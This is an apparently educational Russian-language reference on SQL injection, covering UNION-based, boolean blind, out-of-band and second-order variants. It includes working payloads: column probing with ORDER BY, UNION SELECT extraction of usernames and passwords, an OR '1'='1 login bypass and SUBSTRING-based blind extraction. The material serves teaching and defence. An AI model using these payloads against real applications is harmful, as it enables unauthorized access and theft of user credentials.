**SQL-инъекция** (**SQLi**) — это уязвимость веб-приложения, позволяющая атакующему внедряться в запросы к реляционной базе данных.

## Разновидности

### Внутриполосные (In-Band)

При использовании внутриполосной SQL-инъекции атакующий видит результат выполнения запроса к базе данных.
> [!TIP]
> Отсутствие возвращаемых данных позволяет оценить успешность исполнения атаки в случае перехвате ошибок базы данных веб-приложением.

#### Основанные на UNION

SQL-оператор UNION позволяет совмещать между собой данные из разных таблиц. Атака на данную возможность происходит в три этапа:
- Определение количества столбцов в текущей таблице путём вызова ошибки в `ORDER BY` или `UNION SELECT`:
```sql
-- Если в таблице меньше 3-х столбцов, то возникнет ошибка.
SELECT title FROM products WHERE category = '
  ' ORDER BY 3 --'

-- Если в таблице не 3 столбца, то возникнет ошибка.
SELECT title FROM products WHERE category = '
  ' UNION SELECT NULL, NULL, NULL --'
```
- Поиск хранящих строки столбцов с помощью вызова ошибки присвоения в `UNION SELECT`:
```sql
-- Если 2-й столбец не хранит строку, то возникнет ошибка.
SELECT title FROM products WHERE category = '
  ' UNION SELECT NULL, 'a', NULL
```
- Добавление к найденным столбцам сведений из другой таблицы:
```sql
SELECT title, description FROM products WHERE category = '
  ' UNION SELECT username, password FROM users --'
-- Результат: admin qwerty123
```

> [!TIP]
> Объединение нескольких значений в одну строку позволяет обойти нехватку столбцов:
> ```sql
> SELECT title FROM products WHERE category = '
>   ' UNION SELECT username || '~' || password FROM users--'
> -- Результат: admin~qwerty123
> ```

### Слепые (Blind)

При использовании слепой SQL-инъекции атакующий отслеживает изменения в работе веб-приложения.

#### Основанные на булевых операциях

Условный SQL-оператор `WHERE` позволяет использовать булевы операции, делая возможными различные атаки:
- Обход базовых проверок (always-true-условие):
```sql
SELECT * FROM users WHERE username = 'admin' AND password = '
  ' OR '1'='1
```
- Получение доступа к скрытым сведениям через "безопасные" проверки (напр. токена в cookie):
```sql
-- Проверка на существование ID пользователя
SELECT id FROM users WHERE id = 'COOKIE_VALUE_HERE'
-- Атака: Определение имёни пользователя по буквам
SELECT id FROM users WHERE id = '???
  ' AND SUBSTRING(
    (SELECT username FROM users LIMIT 1), 1, 1
  ) = 'a
```

### Внеполосные (Out-of-Band, OOB)

Бывают случаи, когда сервер не отправляет результат и проследить за его поведением невозможно, например задержка непредсказуемо меняется.

В подобных случаях атакующий может применить внеполосную SQL-инъекцию, вынуждающую сервер базы данных выполнить обращение к внешнему ресурсу: файлу или веб-серверу.

### Второстепенные (Second-order)

При использовании второстепенной SQL-инъекции атакующий сохраняет в базе данных сведения, не влияющие на текущий запрос.
